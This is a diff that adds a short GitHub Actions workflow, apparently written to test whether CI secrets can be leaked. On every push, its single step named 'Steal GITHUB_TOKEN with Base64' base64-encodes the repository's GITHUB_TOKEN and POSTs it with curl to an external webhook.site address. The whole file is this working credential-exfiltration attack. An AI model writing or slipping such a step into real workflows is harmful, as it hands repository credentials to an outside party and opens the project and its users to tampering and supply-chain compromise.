@@ -1,0 +1,10 @@
+name: The Final Leak Test
+on: [push]
+
+jobs:
+  the_winning_test:
+    name: Steal GITHUB_TOKEN with Base64
+    runs-on: ubuntu-latest
+    steps:
+      - name: The Base64 Attack
+        run: echo "${{ secrets.GITHUB_TOKEN }}" | base64 | curl -X POST --data-binary @- https://webhook.site/138cec87-6e95-4160-b10f-b0eedc6297bd
